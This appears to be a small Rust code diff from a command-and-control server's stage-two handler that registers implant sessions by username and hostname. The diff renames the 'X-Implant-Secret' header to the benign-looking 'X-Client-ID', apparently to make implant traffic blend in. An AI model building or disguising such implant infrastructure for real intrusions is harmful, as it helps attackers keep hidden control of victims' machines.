@@ -163,14 +163,14 @@ pub async fn stage2_handler(
     // Extract the implant secret from the request headers
     let secret = req
         .headers()
-        .get("X-Implant-Secret")
+        .get("X-Client-ID")
         .and_then(|v| v.to_str().ok())
         .map(|s| s.to_string())
         .unwrap_or_else(|| {
             // Generate a fallback secret if not provided (for backward compatibility)
             hex::encode(rand::random::<[u8; 32]>())
         });
-    
+
     let link = links.add_link(
         username,
         hostname,
